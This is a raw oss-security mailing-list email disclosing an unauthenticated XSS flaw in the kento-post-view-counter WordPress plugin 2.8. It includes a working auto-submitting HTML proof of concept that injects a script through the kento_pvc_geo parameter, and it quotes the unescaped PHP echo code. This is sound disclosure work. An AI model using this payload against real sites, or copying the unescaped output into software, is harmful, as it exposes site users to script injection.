X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1735" "Saturday" "16" "April" "2016" "13:41:31" "+0530" "shravan kumar" "cor3sm4sh3r@gmail.com" "<CAOmn9FTgrvG=cU61iYqAfUWmAcQe0Hc7h3E3WSfWP17-CRt_Jw@mail.gmail.com>" "82" "[oss-security] Unauthenticated XSS Vulnerability in kento-post-view-counter Wordpress Plugin 2.8" nil nil nil "4" "2016041608:11:31" "[oss-security] Unauthenticated XSS Vulnerability in kento-post-view-counter Wordpress Plugin 2.8" (number mark "U       cor3sm4sh3r@ Apr 16   82/1735  " thread-indent "\"[oss-security] Unauthenticated XSS Vulnerability in kento-post-view-counter Wordpress Plugin 2.8\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 23986 invoked by uid 550); 16 Apr 2016 09:26:06 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 24315 invoked from network); 16 Apr 2016 08:11:42 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to;
        bh=ic5oTYCjxlNE7bzpJD99SPmt9okYTVpyPabrbdBd5xw=;
        b=ZlB9Z/ohXtD+kMkUcmi6NFbW4iQxkVag2t9AuW+98cDRaUpKLhjyK/9ih6NNFF+iJl
         HA2+ov5RUE4Y0ksI+7zlUbOYdylC8E3u2+MT9nINMeQvK13sBXLO/bh2i8qHjCNxvCey
         WEzihtm5viJNqbwT7CN3hsGLjLYIgOFYeAgchr0hDGx+RGXGjz6+Mvpg497Nh347i6ux
         WxAx9XYPV1+cV4WGXI/+2iwvCmkMYqwY2KsD3YPuir02fSc5K5UGTaezhQ6z0emYzwhV
         4rVj6rIrbSwPGahvaf3BpMCDuSjN/apIN8hYJNm4xb4nc8TUeYfaiIvG8hUYLbXFCFu1
         sLXg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:date:message-id:subject:from:to;
        bh=ic5oTYCjxlNE7bzpJD99SPmt9okYTVpyPabrbdBd5xw=;
        b=NgkQTCX/1j/vZksMPakk36l6C80B2mVWE1+vVn67fOHruRrZGqThSoqy/ZoPLWfdhu
         j8z6sFFbY6nc9ORhvee4vhhaX1LeNLJQgJhwXyEtPar23RezpRU+NC6I/9+yta8uI7/D
         i0RTtJq+FurO7zePhjuqSzp84gyZc32lUlCB4QKgLDeBxw9TysP+vAd9XDTvZHkZG0V+
         5qBpKFVE4nzvXvrLj+g+VcRb/SNxazdEcb5cHOk45OAHbo2Gi+zJuW+0xfijOMHExI5w
         mfsZp2L8sHKIpt6xKL8kp5BFhLW7X18jjNa2RGw514Mp139aMg06cElOyCEPrPXP3fLH
         nfsg==
X-Gm-Message-State: AOPr4FWruWSp91kE7tSmXriQvEhf5sacvcGDsMu/tP9tn8msvJhUOhhDdJHZ6cbKh1mf1GUh8l7PwYtPFLJxjg==
MIME-Version: 1.0
X-Received: by 10.107.134.224 with SMTP id q93mr30589822ioi.41.1460794291249;
 Sat, 16 Apr 2016 01:11:31 -0700 (PDT)
Date: Sat, 16 Apr 2016 13:41:31 +0530
Message-ID: <CAOmn9FTgrvG=cU61iYqAfUWmAcQe0Hc7h3E3WSfWP17-CRt_Jw@mail.gmail.com>
From: shravan kumar <cor3sm4sh3r@gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=001a113fd608d1ebfb053095aca7
Subject: [oss-security] Unauthenticated XSS Vulnerability in kento-post-view-counter
 Wordpress Plugin 2.8

--001a113fd608d1ebfb053095aca7
Content-Type: text/plain; charset=UTF-8

I would like to disclose  a Unauthenticated XSS vulnerability
in kento-post-view-counter  plugin version 2.8 .

The Plugin can be found at
*https://wordpress.org/plugins/kento-post-view-counter/
<https://wordpress.org/plugins/kento-post-view-counter/>*

This Bug can be triggered by unauthenticated / Authenticated user. If a
user is sent a URL by social engineering and the user clicks the link the
bug can be triggered.

The URL should be something like this

http://attackerssite.com/XSS_POC.html


The code for XSS_POC.html is as follows:

<html>
  <body onload="document.forms['xss'].submit()" >
    <form name="xss" action="http://targetsite/wp-admin/admin-ajax.php"
method="POST" >

  <input type="hidden" name="action" value="kento_pvc_top_geo" />
  <input type="hidden" name="kento_pvc_geo" value="
<script>alert(1);</script>" />
      <input type="submit" value="Submit" />
    </form>
  </body>
</html>



Technical Details:

The vulnerable page is

wp-content/plugins/kento-post-view-counter/index.php

The Code responsible for the vulnerability :

LINE NO 219 onwards
if(isset($_POST['kento_pvc_geo']))
{
$geo = $_POST['kento_pvc_geo'];
}
if(empty($geo))
{
$geo ="country";
}
.....
....
Line No 240
$top_geo.= "<th scope='col' class='manage-column column-name' ><strong>"
.ucfirst($geo)."</strong></th>";


Line No 245

$top_geo.= "<th scope='col' class='manage-column column-name' ><strong>"
.ucfirst($geo)."</strong></th>";

Line No 283

echo $top_geo;

The $top_geo parameter is displayed in unsafe manner without escaping HTML
chars .

The vulnerable POST parameters is:


   - kento_pvc_geo


-- 
Shravan Kumar

--001a113fd608d1ebfb053095aca7--
